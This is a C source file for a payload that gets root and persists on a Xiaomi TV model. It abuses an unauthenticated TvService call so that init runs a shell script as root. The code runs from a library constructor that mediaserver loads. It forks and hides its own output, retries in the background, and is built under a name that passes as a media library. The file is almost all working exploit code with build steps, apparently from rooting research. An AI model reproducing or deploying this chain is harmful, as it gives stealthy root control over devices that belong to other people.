/* ghostboot.c - MiTV-MFTP0 persistence payload (mediaserver domain)
 *
 * Chain (every link statically verified against sepolicy / ld.config, see
 * WRITEUP.md):
 *   mediaserver starts -> libmiplayeradapter dlopen()s this library from
 *   /data/misc/mitv_upgraded_libs/
 *   -> the constructor forks; the child polls execve() of svc in the same
 *      directory (a copy of /system/bin/service)
 *   -> svc call TvService 4400 s16 s s16 sh,/data/local/tmp/rootd.sh
 *   -> TvService (system_app, no authentication) setprop vendor.misysdiagnose.cmd.*
 *   -> init: exec - root root -- /vendor/bin/misysdiagnose -s sh,/data/local/tmp/rootd.sh
 *
 * Test mode: when /data/local/tmp/.ghost_test exists on the device, the
 * constructor only writes /data/local/tmp/.ghost_ctor_ok and returns (used to
 * validate bionic dlopen compatibility).
 *
 * Build:
 *   zig build-lib -target arm-linux-musleabihf -O ReleaseSmall -dynamic \
 *       -lc ghostboot.c -femit-bin=libmiffmpeg.so
 *
 * NOTE: frozen experiment. It is documented here for reference; the v1 binary
 * carried a DT_NEEDED libc.so entry (double-libc hazard inside mediaserver) and
 * has been deleted. A v2 build must use raw syscalls only, no libc.
 */
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/stat.h>

#define SVC_PATH   "/data/misc/mitv_upgraded_libs/svc"
#define MARKER_OK  "/data/local/tmp/.rootd.ok"
#define TEST_FLAG  "/data/local/tmp/.ghost_test"
#define TEST_MARK  "/data/local/tmp/.ghost_ctor_ok"
#define MAX_TRIES  240          /* 240 * 5s = 20 min */

static void wmark(const char *path)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (fd >= 0) { (void)write(fd, "1\n", 2); close(fd); }
}

__attribute__((constructor))
static void ghostboot_init(void)
{
    pid_t pid;
    int i;

    pid = fork();
    if (pid != 0)
        return;                 /* parent returns immediately, mediaserver keeps working */

    /* ---- child ---- */
    if (access(TEST_FLAG, F_OK) == 0) {
        wmark(TEST_MARK);
        _exit(0);
    }

    for (i = 0; i < MAX_TRIES; i++) {
        pid_t c;
        int st;

        if (access(MARKER_OK, F_OK) == 0)
            _exit(0);           /* rootd.sh already succeeded, done */

        c = fork();
        if (c == 0) {
            int devnull = open("/dev/null", O_WRONLY);
            if (devnull >= 0) {
                dup2(devnull, 1);
                dup2(devnull, 2);
                if (devnull > 2) close(devnull);
            }
            execl(SVC_PATH, "svc", "call", "TvService", "4400",
                  "s16", "s", "s16", "sh,/data/local/tmp/rootd.sh",
                  (char *)NULL);
            _exit(127);         /* svc missing */
        }
        if (c > 0)
            waitpid(c, &st, 0);

        sleep(5);
    }
    _exit(0);
}
